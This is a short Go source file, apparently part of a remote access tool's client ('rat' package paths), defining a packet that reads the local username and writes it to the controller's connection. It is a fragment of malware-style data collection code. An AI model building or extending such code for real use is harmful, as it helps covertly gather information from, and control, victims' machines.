package main

import (
	"rat/client/userinfo"
	"rat/common"
)

type UserInfo struct {
	OutgoingPacket
}

func (packet UserInfo) GetHeader() common.PacketHeader {
	return common.UserInfoHeader
}

func (packet UserInfo) Write(c *Connection) error {
	u := userinfo.GetUser()

	c.WriteString(u.Username)

	return nil
}
